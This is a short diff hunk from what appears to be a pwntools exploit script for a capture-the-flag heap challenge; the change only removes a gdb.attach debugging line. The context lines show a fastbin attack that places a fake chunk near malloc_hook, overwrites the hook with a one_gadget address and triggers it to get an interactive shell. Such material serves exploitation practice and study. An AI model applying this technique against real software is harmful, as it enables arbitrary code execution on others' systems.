@@ -56,7 +56,6 @@ edit(2, p64(malloc_hook_addr - 0x23))  # malloc_hook - 0x23 可以凑 0x7f 的�
 create(4, 0x60)
 create(5, 0x60)
 edit(5, b"a" * (0x13) + p64(one_gadget))
-gdb.attach(io)
 create(6, 0xDEADBEAF)
 
 io.interactive()
